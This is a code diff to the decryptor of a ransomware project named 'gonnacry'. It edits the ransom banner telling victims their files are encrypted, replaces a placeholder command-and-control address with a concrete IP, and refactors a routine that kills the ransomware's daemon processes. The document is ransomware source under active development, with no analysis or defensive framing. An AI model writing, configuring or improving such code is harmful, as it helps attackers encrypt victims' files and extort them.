@@ -27,7 +27,7 @@ logo = """
 ░ ░   ░ ░ ░ ░ ▒     ░   ░ ░    ░   ░ ░   ░   ▒   ░          ░░   ░ ▒ ▒ ░░  
       ░     ░ ░           ░          ░       ░  ░░ ░         ░     ░ ░     
                                                  ░                 ░ ░    
-    ALL YOUR FILES ARE ENCRYPTED WITH AES-CBC-256
+    ALL YOUR FILES ARE ENCRYPTED WITH AES-256-GCM
     YOUR COMPUTER IS INFECTED WITH MALWARE THAT ENCRYPTED ALL YOUR IMPORTANT FILES
     THE ONLY WAY TO GET THEM BACK IS WITH THIS DECRYPTOR
 """
@@ -39,7 +39,7 @@ BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[94m', '\033[91m', '\33[97m'
 
 # environment paths
 ransomware_name = ("gonnacry")
-server_address = "http://C2_SERVER_IP:8000"
+server_address = "http://173.168.0.50"
 home = environment.get_home_path()
 desktop = environment.get_desktop_path()
 username = environment.get_username()
@@ -48,28 +48,17 @@ machine_id = environment.get_unique_machine_id()
 
 
 def kill_daemon():
-    process = subprocess.Popen("pidof daemon", shell=True, stdout=subprocess.PIPE,
-                               stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-    output = process.stdout.read() + process.stderr.read()
-    process2 = subprocess.Popen("pidof gonnacry", shell=True, stdout=subprocess.PIPE,
-                                stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-    pid_of_gonnacry = process2.stdout.read() + process2.stderr.read()
-    
-    process3 = subprocess.Popen("pidof python main.py", shell=True, stdout=subprocess.PIPE,
-                                stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-    pid_of_gonnacry2 = process3.stdout.read() + process3.stderr.read()
-    try:
-        pid_of_gonnacry2 = pid_of_gonnacry2.split(' ')[0]
-    except: 
-        pass
+    def pidof(name):
+        p = subprocess.Popen(f"pidof {name}", shell=True,
+                             stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        return p.stdout.read().decode().strip()
 
-    os.system('kill -9 {}'.format(pid_of_gonnacry))
-    os.system('kill -9 {}'.format(pid_of_gonnacry2))
-    os.system('kill -9 {}'.format(output))
-    os.system("killall daemon")
-    os.system('killall gonnacry')
-    os.system('killall ./gonnacry')
-    os.system('killall ./daemon')
+    for pid in [pidof('daemon'), pidof('gonnacry')]:
+        if pid:
+            os.system(f'kill -9 {pid}')
+
+    os.system("killall daemon 2>/dev/null")
+    os.system("killall gonnacry 2>/dev/null")
 
 
 def decrypt_aes_keys(enc, key):
